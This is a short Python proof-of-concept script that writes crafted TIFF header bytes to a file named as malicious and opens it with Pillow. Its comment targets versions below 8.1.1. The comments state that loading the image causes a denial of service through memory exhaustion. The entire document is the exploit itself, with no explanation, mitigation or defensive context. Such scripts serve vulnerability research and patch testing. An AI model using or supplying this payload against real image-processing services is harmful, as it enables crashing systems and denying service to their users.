from PIL import Image # Pillow < 8.1.1

# Create a malicious image file
with open("malicious_image.tif", "wb") as f:
    f.write(b"II*\x00\x10\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x01\x00\x10\x00")

# Open the malicious image file using Pillow
img = Image.open("malicious_image.tif")

# This will cause a denial of service (memory consumption) due to the vulnerability
img.load()